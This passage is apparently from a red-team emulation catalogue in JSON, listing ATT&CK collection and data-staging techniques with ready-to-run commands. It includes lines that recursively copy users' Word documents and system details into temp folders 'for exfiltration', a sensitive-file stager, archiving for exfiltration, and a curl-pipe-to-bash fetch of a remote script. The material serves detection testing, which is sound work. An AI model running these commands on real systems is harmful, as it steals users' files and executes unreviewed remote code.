            "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n",
            "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null; Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}"
         },
         {
            "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n",
            "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1 && dir c: /b /s .docx | findstr /e .docx && for /R c:\\ %f in (*.docx) do copy /Y %f %temp%\\T1119_command_prompt_collection"
         },
         {
            "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
            "command": "sc query type=service > %TEMP%\\T1119_1.txt && doskey /history > %TEMP%\\T1119_2.txt && wmic process list > %TEMP%\\T1119_3.txt && tree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt"
         },
         {
            "description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n",
            "command": ".\\file_search.ps1 -Extensions '#{windows.included.extensions}' -ExcludedExtensions '#{windows.excluded.extensions}'\n -Directories '#{windows.included.directories}' -ExcludedDirectories '#{windows.excluded.directories}'\n -AccessedCutoff #{file.last.accessed} -ModifiedCutoff #{file.last.modified}\n -SearchStrings '#{file.sensitive.content}' -StagingDirectory '#{windows.staging.location}'\n -SafeMode $#{safe.mode.enabled} -PseudoExtension #{pseudo.data.identifier}\n"
         }
      ]
   },
   "T1074.001": {
      "technique_name": "Data Staged: Local Data Staging",
      "tactic": "collection",
      "known implementations": [
         {
            "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
            "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat"
         },
         {
            "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
            "command": "Compress-Archive -Path \"C:\\Users\\puma-4\\Desktop\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force"
         },
         {
            "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n",
            "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074.001_discovery.log"
         },
         {
            "description": "create a directory for exfil staging",
            "command": "mkdir -p staged && echo $PWD/staged\n"
         },
         {
            "description": "copy files to staging directory",
            "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"
         }
      ]
   },